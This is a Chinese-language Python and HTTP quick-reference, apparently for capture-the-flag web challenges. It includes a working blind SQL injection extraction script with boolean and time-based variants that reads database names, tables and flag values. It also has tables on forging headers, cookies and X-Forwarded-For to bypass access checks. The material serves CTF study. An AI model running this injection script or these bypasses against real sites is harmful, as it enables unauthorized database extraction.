# Python + HTTP 速查

> 用法：写脚本/看请求不记得了 → 翻对应部分

========================================================
# Python 速查
========================================================

## 1. 发请求（requests）

```python
import requests

# GET
resp = requests.get('http://target/?id=1').text

# GET 带参数（自动编码）
resp = requests.get('http://target/', params={'id': '1 and 1=1'}).text

# POST 表单
resp = requests.post('http://target/login', data={'username': 'admin', 'password': 'x'}).text

# 带 Cookie / 请求头
resp = requests.get(url, cookies={'role': 'admin'}, headers={'User-Agent': 'x'}).text
```

## 2. 常用操作

```python
'关键字' in resp          # 判断页面里有没有某段文字（盲注信号）
len(resp)                 # 页面长度（可用于判断页面是否变化）
time.time()               # 当前时间戳（时间盲注计时用）
chr(102)                  # 数字→字符：'f'
ord('f')                  # 字符→数字：102
str(5)                    # 数字→字符串
'%d' % 5                  # 占位符填值：'5'
'%s和%s' % (a, b)         # 多个占位符
"f'{(1+1)}'"              # f-string 插值（Python3.6+）
```

## 3. 盲注脚本骨架（改子查询就能用）

```python
import requests, time

URL = 'http://target/?id='

def ask(cond):   # 布尔版：页面文字
    return '正常关键字' in requests.get(URL + '1/**/and/**/' + cond, timeout=10).text

def ask_time(cond):   # 时间版：响应耗时
    t0 = time.time()
    try: requests.get(URL + '1 and if(' + cond + ',sleep(1),0)', timeout=10)
    except Exception: pass
    return time.time() - t0 > 0.6

def extract(subq, stop='}'):
    out = ''
    for pos in range(1, 60):
        lo, hi = 32, 127
        while lo < hi:
            mid = (lo + hi) // 2
            if ask('ascii(substr((%s),%d,1))>%d' % (subq, pos, mid)):
                lo = mid + 1
            else: hi = mid
        ch = chr(lo)
        if ch == ' ': break
        out += ch
        if ch == stop: break
    return out

# 用法示例
# extract('database()')
# extract('table_name from information_schema.tables where table_schema=database() limit 0,1')
# extract('flag from flag_table')
```

## 4. 报错排查（Python）

| 报错 | 意思 | 怎么办 |
|------|------|--------|
| NameError: xx is not defined | 变量/函数名拼错 | 检查拼写 |
| SyntaxError | 语法错误 | 看报错指出的行 |
| TypeError: can only concatenate str | 字符串拼了非字符串 | 用 str() 转换 |
| ModuleNotFoundError | 库没装 | pip install requests |
| IndexError | 索引越界 | 检查列表长度 |
| requests 一直报错/超时 | 网络/URL 问题 | 先 curl 试试 URL 对不对 |

---

========================================================
# HTTP 速查
========================================================

## 5. 请求结构（读源码/看抓包用）

```
请求行：GET /path HTTP/1.1        （方法 + 路径 + 协议版本）
请求头：Host / User-Agent / Referer / Cookie / Content-Type ...
空行
请求体（POST 才有）
```

## 6. 方法速查

| 方法 | 用途 | 注入场景 |
|------|------|----------|
| GET | 取数据 | 参数在 URL 的 ? 后面 |
| POST | 提交 | 参数在请求体；登录/留言 |
| HEAD | 只要响应头 | 有时绕过只拦 GET/POST 的检查 |
| OPTIONS | 问支持哪些方法 | 探测 |
| PUT | 上传 | 老系统未授权 PUT 漏洞 |
| DELETE | 删除 | - |

## 7. 状态码速查

| 码 | 意思 | 做题含义 |
|----|------|----------|
| 200 | 成功 | 正常 |
| 301/302 | 重定向 | 看 Location 头（curl -L 跟随） |
| 403 | 禁止 | 换方法/换头/换路径试试 |
| 404 | 不存在 | 路径错了 |
| 405 | 方法不允许 | 提示换方法（ch1 考点） |
| 500 | 服务器错 | 可能触发了漏洞 |

## 8. 常用请求头（全部可伪造）

| 头 | 含义 | 伪造场景 |
|----|------|----------|
| User-Agent | 客户端标识 | 伪造特定 UA 过检查 |
| Referer | 来源页面 | 伪造来源过检查 |
| Cookie | 键值对 | 伪造身份（ch3） |
| X-Forwarded-For | 客户端IP（代理加） | 伪造 IP 过'只允许内网' |
| Content-Type | 请求体格式 | 改类型绕过解析 |
| Host | 目标主机 | Host 头注入 |

## 9. curl 速查（PowerShell 里用 curl.exe！）

```powershell
curl.exe -X POST http://x/            # 指定方法
curl.exe -d 'a=1&b=2' http://x/       # POST 表单数据
curl.exe -H 'User-Agent: x' http://x/ # 自定义头
curl.exe -b 'role=admin' http://x/    # 带 Cookie
curl.exe -c cookies.txt http://x/     # 存 Cookie 到文件
curl.exe -e 'http://x/' http://x/     # 伪造 Referer
curl.exe -v http://x/                 # 显示完整请求响应
curl.exe -L http://x/                 # 跟随重定向
curl.exe -o 文件 http://x/            # 保存响应到文件
```

**坑**：
- PowerShell 里 curl 是 Invoke-WebRequest 别名 → 必须用 curl.exe
- 双引号里的 & 会报错 → 参数用单引号包
- URL 里的特殊字符要编码：空格 %20、# %23、单引号 %27、; %3B、| %7C

## 10. Cookie 与 Session

| | 存哪 | 浏览器里有什么 | 能伪造吗 |
|--|------|--------------|----------|
| Cookie | 浏览器 | 明文键值对 | 能，直接改 |
| Session | 服务器 | 一串随机 id | 不能改内容，可偷/爆破 |

**HttpOnly**：JS 读不到（防 XSS 偷 Cookie）

## 11. URL 编码

```
%XX 十六进制：空格=%20，a=%61，?=%3F，#=%23，&=%26
服务器收到 URL 先解码再处理（$_GET 里已是解码后值）
```

## 12. PHP 读请求变量（读源码用）

```php
$_GET['x']            // URL 参数 ?x=...
$_POST['x']           // POST 表单参数
$_COOKIE['x']         // Cookie
$_SERVER['HTTP_UA']   // 请求头（HTTP_ + 大写 + 下划线）
$_SERVER['REQUEST_METHOD']  // 方法
$_FILES['f']          // 上传的文件
```

---

## 心法

> 请求头都可伪造 ｜ 先 F12 看请求再动手 ｜ curl.exe 记得带 .exe ｜ 编码符号别忘 %
